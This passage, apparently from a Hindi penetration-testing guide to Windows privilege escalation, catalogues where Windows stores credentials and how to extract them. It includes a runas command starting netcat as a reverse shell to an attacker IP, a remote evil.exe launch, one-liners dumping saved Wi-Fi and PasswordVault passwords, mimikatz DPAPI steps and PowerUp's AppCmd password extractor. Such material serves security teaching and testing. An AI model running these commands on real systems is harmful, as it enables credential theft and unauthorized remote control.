```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

bash को root के रूप में आसानी से शुरू करने के लिए, आप `--default-user root` आज़मा सकते हैं।

आप `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` फ़ोल्डर में `WSL` filesystem देख सकते हैं।

`WSL` के अंदर Linux `root` होने से अपने-आप Windows Administrator अधिकार नहीं मिलते। यदि मौजूदा Windows identity किसी distribution के filesystem को पढ़ सकती है, तो shell-history फ़ाइलें (इसमें `/root/.bash_history` भी शामिल है) जाँचें कि कहीं उनमें ऐसे commands तो दर्ज नहीं हैं जिनसे credentials मिल सकते हों। अधिकार बढ़ाने के लिए फिर भी किसी वैध, उच्च-अधिकार वाले account और अनुमत authentication path की ज़रूरत होती है। `LocalState\rootfs` का layout पुराने WSL installations पर लागू होता है; WSL 2 में आम तौर पर distribution एक [`ext4.vhdx` virtual disk](https://learn.microsoft.com/en-us/windows/wsl/disk-space) में रखी जाती है, इसलिए पहले वास्तविक distribution और storage path की पहचान करें। स्वचालित enumeration के दौरान history की सामग्री प्रिंट करने से बचें।

## Windows क्रेडेंशियल्स

### Winlogon क्रेडेंशियल्स

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` और `DefaultDomainName` को credentials नहीं, बल्कि account context मानें। गैर-खाली `DefaultPassword` या `AltDefaultPassword` मान plaintext registry finding है। यदि `AutoAdminLogon=1` है, लेकिन कोई plaintext password पढ़ा नहीं जा सकता, तो यह केवल एक lead है: [Sysinternals Autologon password को LSA secret के रूप में store कर सकता है](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), और सामान्य registry reads से यह साबित नहीं होता कि वह secret मौजूद है या उसे retrieve किया जा सकता है। Credential exposure की रिपोर्ट करने से पहले access rights और वास्तविक logon configuration की समीक्षा करें।

### Credentials manager / Windows vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault servers, websites और अन्य programs के लिए user credentials store करता है, जिनका इस्तेमाल **Windows** **users को automatically log in करने** के लिए कर सकता है। शुरू में ऐसा लग सकता है कि users Facebook, Twitter या Gmail जैसी sites के credentials store कर सकते हैं और browsers को automatically log in करा सकते हैं, लेकिन यह ऐसे काम नहीं करता।

Windows Vault वे credentials store करता है जिनका इस्तेमाल Windows users को automatically log in करने के लिए कर सकता है। इसका मतलब है कि **किसी resource** (server या website) तक पहुंचने के लिए credentials की ज़रूरत वाला कोई भी **Windows application** इस Credential Manager और Windows Vault का **इस्तेमाल कर सकता है**, और हर बार users से username और password दर्ज कराने के बजाय दिए गए credentials का उपयोग कर सकता है।

जब तक applications Credential Manager के साथ interact नहीं करतीं, मुझे नहीं लगता कि उनके लिए किसी दिए गए resource के credentials का इस्तेमाल करना संभव है। इसलिए, यदि आपका application vault का इस्तेमाल करना चाहता है, तो उसे किसी तरह **credential manager से communicate करके उस resource के credentials का अनुरोध** default storage vault से करना चाहिए।

मशीन पर stored credentials की सूची देखने के लिए `cmdkey` का इस्तेमाल करें।

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

इसके बाद, सहेजे गए credentials का उपयोग करने के लिए `/savecred` विकल्प के साथ `runas` का उपयोग किया जा सकता है। निम्न उदाहरण SMB share के ज़रिए remote binary को कॉल करता है।

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

दिए गए credentials के सेट के साथ `runas` का उपयोग करना।

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) का उपयोग किया जा सकता है।

### UWP PasswordVault / Credential Locker

आधुनिक Windows UWP applications, Microsoft Edge और आधुनिक system services authentication tokens और plaintext passwords को Universal Windows Platform (UWP) `PasswordVault` के अंदर store करते हैं (इसे `vaultcmd` में `Web Credentials` के रूप में भी दिखाया जाता है)। यह storage space अलग-अलग sessions तक सीमित रहता है और इसे बिना administrative या `SeDebugPrivilege` अधिकारों के मूल रूप से decrypt किया जा सकता है।

सभी stored usernames और plaintext passwords को तुरंत dump और decrypt करने के लिए, उपयोगकर्ता के active session के अंदर यह PowerShell command चलाएँ:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** डेटा के symmetric encryption के लिए एक तरीका प्रदान करता है। इसका उपयोग मुख्य रूप से Windows operating system में asymmetric private keys को symmetric encryption से सुरक्षित करने के लिए किया जाता है। इस encryption में entropy को काफी बढ़ाने के लिए user या system secret का उपयोग किया जाता है।

**DPAPI, user के login secrets से प्राप्त symmetric key के ज़रिए keys को encrypt करने की सुविधा देता है**। System encryption के मामलों में, यह system के domain authentication secrets का उपयोग करता है।

DPAPI से encrypt की गई user RSA keys `%APPDATA%\Microsoft\Protect\{SID}` directory में store की जाती हैं, जहाँ `{SID}` user के [सुरक्षा पहचानकर्ता](https://en.wikipedia.org/wiki/Security_Identifier) को दर्शाता है। **DPAPI key, जो उसी file में user की private keys को सुरक्षित रखने वाली master key के साथ मौजूद होती है**, आमतौर पर 64 bytes के random data से बनी होती है। (ध्यान दें कि इस directory तक पहुँच सीमित है, इसलिए CMD में `dir` command से इसके contents की listing नहीं की जा सकती, हालाँकि PowerShell के ज़रिए listing की जा सकती है।)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

आप इसे decrypt करने के लिए उचित arguments (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग कर सकते हैं।

**master password से protected credentials files** आमतौर पर यहाँ स्थित होती हैं:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

आप उचित `/masterkey` का उपयोग करके **mimikatz module** `dpapi::cred` से decrypt कर सकते हैं।\
अगर आप root हैं, तो `sekurlsa::dpapi` module से **memory** में मौजूद कई **DPAPI** **masterkeys** **extract** कर सकते हैं।


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** का उपयोग अक्सर **scripting** और automation tasks के लिए encrypted credentials को सुविधाजनक ढंग से store करने के तरीके के रूप में किया जाता है। ये credentials **DPAPI** का उपयोग करके सुरक्षित होते हैं, जिसका आम तौर पर अर्थ है कि इन्हें केवल उसी user द्वारा, उसी computer पर decrypt किया जा सकता है जिस पर ये बनाए गए थे।

Export किए गए credential का filename या `.xml` path कुछ भी हो सकता है। जब कोई script या file inventory इसकी ओर संकेत करे, तो `C:\Users` मान लेने के बजाय account की वास्तविक profile directory का पता लगाएँ: [Windows profiles को दूसरी जगह रख सकता है](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)। किसी file का पढ़ा जा सकना केवल एक सुराग है; [Windows का `Export-Clixml` encrypted credential को export करने वाले user और computer से जोड़ता है](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), और recovered account के पास इच्छित service पर अलग से valid rights होने चाहिए। नियमित enumeration के दौरान encrypted या plaintext values print किए बिना पहले paths और ACLs inspect करें।

फ़ाइल में मौजूद PS credentials को **decrypt** करने के लिए आप यह कर सकते हैं:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### सहेजे गए RDP कनेक्शन

आप इन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\` में पा सकते हैं।

### हाल ही में चलाए गए कमांड

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** के `dpapi::rdg` module का उपयोग उपयुक्त `/masterkey` के साथ किसी भी .rdg files को **decrypt** करने के लिए करें।\
Mimikatz के `sekurlsa::dpapi` module से आप memory से कई DPAPI masterkeys **extract** कर सकते हैं।

**mRemoteNG एक अलग connection store का उपयोग करता है।** `%APPDATA%\mRemoteNG` और user Documents में पढ़े जा सकने वाले XML की जाँच करें। इनमें `config.xml` जैसे सामान्य नामों वाली files भी शामिल हैं। XML file को credential lead मानने से पहले उसके connection schema और encrypted `Password` attributes की पहचान करें। संग्रहित value DPAPI/RDCMan password नहीं है; इसे recover करना file की encryption settings और custom master password के उपयोग पर निर्भर करता है। बड़े पैमाने पर enumeration करते समय encrypted values को प्रिंट करने से बचें।

**Remote Desktop Plus profile exports** user directories या साझा administration folder में पढ़े जा सकने वाले रूप में भी मौजूद हो सकते हैं। पुराने `profiles.xml` export में `ProfileName`, `Password`, और `Secure` elements वाली `Data/Profile` entries होती हैं। गैर-खाली password element को credential lead मानें, लेकिन उसे प्रिंट न करें और न ही यह मानें कि वह plaintext है: [vendor के अनुसार](https://www.donkz.nl/), profile protection बनाने वाले account और computer से जुड़ी हो सकती है, या कम सख्ती से configure की गई हो सकती है। उस पर भरोसा करने से पहले file के origin और उसे recover करने की शर्तों की पुष्टि करें।

### Sticky Notes

लोग कभी-कभी sticky-note applications में passwords और अन्य जानकारी सहेजते हैं। Microsoft का packaged Sticky Notes app आम तौर पर notes को `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` में store करता है; पुराने या अलग apps अन्य user-profile stores का उपयोग कर सकते हैं, जिनमें LevelDB भी शामिल है। SQLite file न मिलने को notes न होने का प्रमाण मानने से पहले installed app और storage format की पहचान करें।

अगर Sticky Notes SQLite write-ahead logging का उपयोग कर रहा है, तो केवल `plum.sqlite` की copy में हाल ही में commit किए गए notes छूट सकते हैं। Database की एक सुसंगत copy के साथ संबंधित `plum.sqlite-wal` भी रखें, और उपलब्ध होने पर `plum.sqlite-shm` शामिल करें; shared-memory index दोबारा बनाया जा सकता है, लेकिन WAL database की persistent state का हिस्सा है। [SQLite का WAL documentation](https://www.sqlite.org/wal.html) देखें। Account name या password वाले note को केवल credential lead मानें: account, अनुमत access, और password reuse की अलग से पुष्टि करें। Encrypted password-manager record से higher-privilege login स्थापित करने के लिए उसकी वास्तविक decryption key और application-specific interpretation भी आवश्यक हैं।

### AppCmd.exe

**ध्यान दें कि AppCmd.exe से passwords recover करने के लिए आपको Administrator होना चाहिए और High Integrity level के अंतर्गत चलाना होगा।**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` directory में स्थित है।\
अगर यह file मौजूद है, तो संभव है कि कुछ **credentials** configure किए गए हों और उन्हें **recover** किया जा सके।

यह code [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) से लिया गया था:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

जाँचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है या नहीं।\
Installers को **SYSTEM privileges के साथ चलाया जाता है**, इनमें **DLL Sideloading की कमजोरियाँ हो सकती हैं (जानकारी का स्रोत** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**)।**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## फ़ाइलें और Registry (Credentials)

### Support-tool registry credential artifacts

कुछ पुराने remote-support installations में fixed application registry keys के अंतर्गत password-संबंधी value names बने रह सकते हैं। उदाहरण के लिए, [vendor की registry-key व्याख्या](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) के अनुसार, TeamViewer का `SecurityPasswordAES` version 9 से पहले configured static session password को दर्शाता था। Value-name marker केवल जाँच का संकेत है: उस credential का आकलन करने से पहले installed version, readable value data, format और मौजूदा authentication behavior verify करें। Remote-support password से अधिक privileged Windows account तक पहुँचने के लिए उस account में वास्तव में password reuse होना और उसका उपयोग करने की authorization भी आवश्यक है। Routine enumeration output में ciphertext और recovered passwords न रखें।

### Protected sheets वाली shared spreadsheets

यदि संदेह हो कि readable shared workbook में account data है, तो **file encryption** और worksheet protection या hidden columns में अंतर करें। [Microsoft के अनुसार](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), worksheet protection editing को नियंत्रित करती है और security feature नहीं है; केवल इससे यह साबित नहीं होता कि workbook का content encrypted है। केवल authorized और relevant files की समीक्षा करें, और व्यापक enumeration के दौरान संभावित secrets print करने से बचें। केवल readable `.xlsx` path, protected sheet या hidden column से यह साबित नहीं होता कि credentials मौजूद हैं या किसी account के पास अधिक privileges हैं; वास्तविक data और मौजूदा account rights अलग से verify करें।

### CI server में रखे गए change patches

Build पूरा होने के बाद भी CI server अपने data directory में submitted source changes रख सकता है। [TeamCity के दस्तावेज़](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` को remote-run changes के storage के रूप में बताते हैं; data directory को configure किया जा सकता है और यह आवश्यक नहीं कि `ProgramData` के अंतर्गत हो। Readable patch में credential file, encryption key या दोनों का उपयोग करने वाली script के हटाए गए या जोड़े गए references सुरक्षित रह सकते हैं। उदाहरण के लिए, PowerShell का `ConvertTo-SecureString -Key` workflow, AES key और encrypted string—दोनों मांगता है; [Microsoft के दस्तावेज़](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) के अनुसार, key अलग से दी जाती है। पहले केवल accessible patch names की समीक्षा करें, फिर authorization के अंतर्गत relevant content देखें; routine enumeration output में secrets print न करें। केवल patch path, encrypted value या key reference से valid credential या higher-privilege access साबित नहीं होता। Data-directory ACLs सीमित रखें और build changes में secrets commit करने से बचें।

### Custom local administrator password rotation

घर में बनाया गया password rotator, encrypted local administrator password को local service में रख सकता है, जबकि उसके datastore credentials किसी readable `.env` file में या updater binary के पास रखे हों। Updater के scheduled task, account, configuration ACLs, listener और datastore permissions—सभी की एक साथ समीक्षा करें। केवल loopback पर उपलब्ध datastore तक भी ऐसा local user पहुँच सकता है जिसके पास valid credentials हों, लेकिन केवल authentication से relevant records पढ़ने की permission साबित नहीं होती। यदि encryption seed या key material ciphertext के पास accessible हो, तो encryption पर भरोसा करने से पहले exact key derivation की समीक्षा करें। Exposed seed से Go के [`math/rand`](https://pkg.go.dev/math/rand) का उपयोग करके deterministic रूप से AES key निकालने वाली scheme उस password को सुरक्षित रखने के लिए अनुपयुक्त है; Go के दस्तावेज़ इस package को security-sensitive randomness के लिए अनुपयुक्त बताते हैं। Recovered password को escalation path मानने से पहले पुष्टि करें कि वह अभी भी valid है और local Administrators-group account का है। केवल scheduled task, `.env` path या encrypted blob से इनमें से कोई भी शर्त साबित नहीं होती। Routine enumeration output में passwords और key material न रखें।

Managed local administrator passwords के लिए [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) का उपयोग करें। इसका directory या Entra-backed storage और access controls, custom local datastore से अलग हैं; [Elasticsearch roles](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) भी तय करते हैं कि authenticated datastore user किसी specific index को पढ़ सकता है या नहीं।

### Java server plugin archives और credential reuse

कुछ Java server plugins, server की `plugins` directory में JAR archives के रूप में वितरित किए जाते हैं। किसी readable custom plugin में embedded service credential वाला configuration या bytecode हो सकता है। Archive की समीक्षा केवल authorization होने पर करें और recovered secrets को routine enumeration output से बाहर रखें। केवल plugin path से secret का मौजूद होना साबित नहीं होता, और recovered service password से higher privileges तभी मिलते हैं जब वह किसी अधिक privileged account के लिए भी valid हो। Relevant file ACLs जाँचें और reused credentials को अलग-अलग secrets से बदलें। Directory layout के लिए [PaperMC की plugin installation guide](https://docs.papermc.io/paper/adding-plugins/) और archive contents के लिए [Oracle का JAR documentation](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) देखें।

### Openfire embedded database credentials

Embedded database का उपयोग करने वाला Openfire installation, `openfire.script` को `Openfire\embedded-db` के अंतर्गत रख सकता है। यदि मौजूदा account इसे पढ़ सकता है, तो `OFUSER` records और `passwordKey` property—दोनों की समीक्षा करें। Openfire के [user-provider documentation](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) के अनुसार, passwords plain text में या उस property में रखी key से encrypted रूप में संग्रहीत किए जा सकते हैं। Recovered password escalation के लिए तभी मायने रखता है जब वह अब भी किसी अधिक privileged identity के लिए valid हो; केवल file name से न तो read access साबित होता है, न credential reuse। यह path केवल inventory का संकेत है, इसलिए database content और credentials को routine enumeration output से बाहर रखें।

अलग `Openfire\conf\openfire.xml` file, external database उपयोग होने पर भी, admin console के configured ports और bind interface का पता दे सकती है। Openfire अक्सर अपने admin console को loopback पर bind करता है; listener चल रहा हो तो local account फिर भी उस address तक पहुँच सकता है। Actual listener, authorized admin role, plugin-upload policy और Openfire service identity—सभी जाँचें। Plugin install कर सकने वाला admin, plugin code को service के context में चलवा सकता है; यदि service LocalSystem के रूप में चलती है, तो यह context अत्यधिक privileged हो सकता है। Matching account password या readable configuration path अकेले admin-console access या code execution साबित नहीं करता। Vendor की [installation and plugin-management guide](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) और [plugin-upload API property](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html) देखें।

### Forensic management server configuration

Velociraptor server configurations, जिनका सामान्य नाम `server.config.yaml` होता है, में internal CA का `CA.private_key` हो सकता है। यदि कम privileged user उस key को पढ़ सकता है, तो वह API client certificate बना सकता है। इससे higher privileges मिलेंगे या नहीं, यह server के user roles, API reachability और server या target agent जिस identity के अंतर्गत चलता है—उन पर निर्भर करता है। Client configuration में अलग material होता है; उसे मिलने से server CA तक access साबित नहीं होता। कुछ deployments में CA private key offline रखी जाती है, इसलिए readable server configuration में signing key भी न हो सकती है।

Windows server पर, installation directory में मौजूद **server** configuration और उसकी protected backup copies के ACL की जाँच करें। एक संभावित location `%ProgramFiles%\VelociraptorServer\server.config.yaml` है; यदि service में configured path अलग हो, तो उसी का उपयोग करें। पुष्टि करें कि मौजूदा identity file पढ़ सकती है और `CA.private_key` वास्तव में मौजूद है। Private key को logs या enumeration output में print न करें। Vendor का `config api_client` workflow client certificate जारी करने के लिए CA key का उपयोग करता है, लेकिन इसके लिए प्रभावी server-side role भी आवश्यक है; ऐसा role बनाने या बदलने के लिए datastore write access या restart की आवश्यकता हो सकती है। ये writes उपलब्ध न होने पर भी, कोई मौजूदा privileged server identity रास्ता दे सकती है। Execution rights वाली API queries relevant server या agent context में चलती हैं, जो अत्यधिक privileged हो सकता है।

Server configuration और backups को restrictive ACLs से सुरक्षित रखें, जहाँ संभव हो CA signing key को offline रखें, और API roles तथा listener access सीमित करें। [Velociraptor API documentation](https://docs.velociraptor.app/docs/server_automation/server_api/) और [security configuration guidance](https://docs.velociraptor.app/docs/deployment/security/) देखें।

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY एक अलग session manager है। इसका native encrypted store `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` पर हो सकता है, जबकि exported session backup का नाम `sessions-backup.dat` हो सकता है और वह कहीं और stored हो सकता है। [SolarWinds की export guide](https://thwack.solarwinds.com/discussion/comment/115591) के अनुसार, exports password-encrypted होते हैं और उनमें sessions, keys, scripts, tags और relationships हो सकते हैं; इसका [support forum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) native store की पहचान करता है। पहले file permissions और paths जाँचें। इनमें से कोई भी file मिलने से उसका password पता नहीं चलता और न ही यह साबित होता है कि कोई saved credential अब भी valid है या उसके पास अधिक privileges हैं।

### PuTTY SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Registry में SSH keys

SSH private keys registry key `HKCU\Software\OpenSSH\Agent\Keys` के अंदर stored हो सकती हैं, इसलिए जाँचें कि वहाँ कुछ दिलचस्प है या नहीं:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

अगर आपको उस path के अंदर कोई entry मिलती है, तो संभवतः वह सेव की गई SSH key होगी। यह encrypted रूप में stored होती है, लेकिन इसे [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके आसानी से decrypt किया जा सकता है।\
इस technique के बारे में अधिक जानकारी यहाँ है: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

अगर `ssh-agent` service चल नहीं रही है और आप चाहते हैं कि यह boot पर अपने आप start हो जाए, तो चलाएँ:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> ऐसा लगता है कि यह तकनीक अब मान्य नहीं है। मैंने कुछ ssh keys बनाने, उन्हें `ssh-add` से जोड़ने और ssh के ज़रिए किसी मशीन में लॉगिन करने की कोशिश की। रजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### अनअटेंडेड फ़ाइलें

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

आप इन फ़ाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM बैकअप

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

पढ़ी जा सकने वाली Windows Imaging (`.wim`) backup फ़ाइलों में offline `SAM`, `SECURITY` और `SYSTEM` hives भी हो सकते हैं। स्थानीय रूप से उपलब्ध backup या image directories को प्राथमिकता दें और कुछ भी extract करने से पहले image के **member names** जाँचें; केवल `.wim` filename से यह साबित नहीं होता कि hives उजागर हैं, और सामान्य `install.wim`, `boot.wim` तथा recovery images अक्सर गलत सुराग होते हैं। SMB share एक अलग access path है और उसे तभी जाँचना चाहिए जब वह share दायरे में हो। Microsoft की [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) और [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) देखें।

### Cloud Credentials

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** नाम की फ़ाइल खोजें

### Cached GPP Password

पहले एक ऐसी सुविधा उपलब्ध थी, जिससे Group Policy Preferences (GPP) के ज़रिए कई मशीनों पर कस्टम स्थानीय administrator खाते तैनात किए जा सकते थे। हालाँकि, इस तरीके में सुरक्षा की गंभीर खामियाँ थीं। पहली बात, SYSVOL में XML फ़ाइलों के रूप में संग्रहीत Group Policy Objects (GPOs) को कोई भी डोमेन उपयोगकर्ता ऐक्सेस कर सकता था। दूसरी बात, इन GPPs में AES256 से एन्क्रिप्ट किए गए पासवर्ड, सार्वजनिक रूप से दस्तावेज़ीकृत डिफ़ॉल्ट key का उपयोग करके, कोई भी authenticated उपयोगकर्ता decrypt कर सकता था। इससे गंभीर जोखिम पैदा हुआ, क्योंकि उपयोगकर्ता elevated privileges हासिल कर सकते थे।

